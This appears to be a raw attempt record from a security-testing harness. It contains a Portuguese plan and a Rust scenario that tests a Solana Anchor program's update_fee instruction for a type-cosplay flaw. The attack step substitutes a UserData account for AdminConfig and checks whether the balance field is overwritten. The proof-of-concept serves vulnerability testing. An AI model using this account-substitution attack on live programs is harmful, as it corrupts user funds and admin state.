attempts.raw:
{
  "plan": "O cenário monta uma conta AdminConfig legítima com admin = authority e fee_basis_points = 100, e uma conta UserData com o mesmo layout de tamanho (discriminador diferente, authority = authority, balance = 999). O baseline chama update_fee com a conta AdminConfig e a authority como signer, provando que o cenário está correto. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, mantendo a mesma authority signer. O efeito mede se a instrução aceitou a conta de tipo errado: se o ataque tiver sucesso, o campo balance da UserData (offset 40) terá sido sobrescrito com o novo fee, demonstrando o type cosplay.",
  "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();
let user_key = Pubkey::new_unique();

let config_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let user_data = anchor_account_data("UserData", &(authority, 999u64));

let config_account = account(&env.program_id, &config_data, None);
let user_account = account(&env.program_id, &user_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix = env.anchor_ix("update_fee", &(500u64,), metas);

let contas = vec![
    (config_key, config_account.clone()),
    (authority, authority_account.clone()),
];

let baseline = env.baseline("update_fee legitimo com AdminConfig", &ix, &contas);

let attack_metas = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority, true),
];
let attack_ix = env.anchor_ix("update_fee", &(500u64,), attack_metas);

let attack_contas = vec![
    (user_key, user_account.clone()),
    (authority, authority_account.clone()),
];

let r = env.attack("update_fee com UserData no lugar de AdminConfig", &attack_ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let user_after = after(&r, &user_key);
    env.effect(
        "UserData aceita como AdminConfig: balance sobrescrito com o novo fee",
        read_u64(user_after.data(), 40) == 500u64,
    );
}"
}

